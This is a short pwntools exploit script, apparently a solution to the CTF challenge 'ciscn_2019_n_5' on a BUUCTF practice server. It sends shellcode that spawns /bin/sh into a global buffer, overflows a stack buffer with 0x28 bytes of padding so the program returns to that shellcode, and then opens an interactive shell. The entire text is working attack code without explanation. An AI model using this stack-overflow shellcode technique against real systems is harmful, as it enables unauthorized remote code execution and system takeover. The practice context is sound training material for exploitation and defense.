from pwn import *

context(log_level='debug', arch='amd64', os='linux' )

io = remote("node4.buuoj.cn",28580)
# io = process("ciscn_2019_n_5")
e = ELF('ciscn_2019_n_5')

pop_rdi_ret = 0x0400713
shellcode = asm(shellcraft.sh())
sh_addr = e.sym['name']

junk = 'a' * (0x20 + 8)
payload = flat(junk, sh_addr)

io.sendline(shellcode)
io.sendline(payload)
io.interactive()
